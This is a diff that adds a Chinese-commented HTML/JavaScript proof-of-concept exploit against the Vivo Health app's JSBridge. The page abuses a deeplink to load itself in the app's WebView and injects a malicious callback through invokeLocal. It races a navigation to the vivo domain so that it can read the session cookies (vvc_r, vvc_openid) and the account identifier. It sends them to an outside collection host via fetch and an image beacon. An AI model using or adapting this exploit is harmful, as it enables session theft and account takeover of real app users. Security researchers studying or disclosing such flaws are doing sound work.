@@ -1,0 +1,58 @@
+<script>
+// ============================================================
+// Vivo Health JSBridge TOCTOU Attack — 纯 HTML PoC（无需 Frida）
+//
+// 用法：
+//   浏览器访问 ?1 → 跳转 Deeplink 唤起 App → App 内加载此页（无参数）→ 执行攻击
+//
+// 攻击链：
+//   1. 浏览器访问 http://ath3r1s.top:9995/vivo-health-poc.html?1
+//      → 跳转 vivohealth:// Deeplink 唤起 App
+//   2. App WebAgentActivity 加载此页（无参数）→ JSBridge 无条件注入
+//   3. invokeLocal('getBetaSurver','{}', EVIL_IIFE) — callbackId 为恶意自执行函数
+//   4. getBetaSurver 异步回调 → callBackToJs 在 UI 线程排队（无域名检查）
+//   5. window.location.href 导航到 vivo 域 → setBaseCookies 自动注入 vvc_r=getToken()
+//   6. 排队的 callBackToJs 在 vivo 域上下文执行 → document.cookie 含 vvc_r/vvc_openid
+//   7. 恶意 IIFE 窃取 Cookie 外发
+// ============================================================
+
+var EXFIL = "https://bin.pwn.icu/exercise";
+var SELF = "http://ath3r1s.top:9995/vivo-health-poc.html";
+
+// ===== 入口：浏览器访问时跳转 Deeplink 唤起 App =====
+var params = new URLSearchParams(location.search);
+if (params.get('1') !== null || params.get('deeplink') === '1') {
+    location.href = "vivohealth://health-h5.vivo.com.cn/openApp?to=web&param_url=" + encodeURIComponent(SELF) + "&from=share";
+    throw new Error("redirecting to deeplink");
+}
+
+// ===== 以下为 App 内 WebView 加载时执行 =====
+
+// 恶意 IIFE callbackId — 只在 vivo 域名上下文（Cookie 含 vvc_）才外发
+var EVIL = "(function(d){try{if(document.cookie&&document.cookie.indexOf('vvc_')>=0){fetch('" + EXFIL + "?c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href),{mode:'no-cors'}).catch(function(){})}}catch(e){}})";
+
+// 正常回调 — 当前页面直接获取 vivoAccount（callBackToJs 无域名检查）
+function onAccount(d) {
+    try {
+        var r = JSON.parse(d);
+        if (r.data && r.data.vivoAccount) {
+            new Image().src = EXFIL + "?a=" + encodeURIComponent(r.data.vivoAccount) + "&n=" + encodeURIComponent(r.data.bbsName || "");
+        }
+    } catch(e) {}
+}
+
+// Phase 1: 当前页面获取账号标识（无需导航）
+try { window.health.invokeLocal("getBetaSurver", "{}", "onAccount"); } catch(e) {}
+
+// Phase 2: TOCTOU — 注入恶意回调 + 导航 vivo 域名
+function inject() {
+    try { window.health.invokeLocal("getBetaSurver", "{}", EVIL); } catch(e) {}
+}
+
+for (var i = 0; i < 500; i++) {
+    setTimeout(inject, 10 + i);
+}
+
+// 导航到 vivo 域名 — Cookie 自动注入（vvc_r = getToken()）
+window.location.href = "https://health-h5.vivo.com.cn/";
+</script>
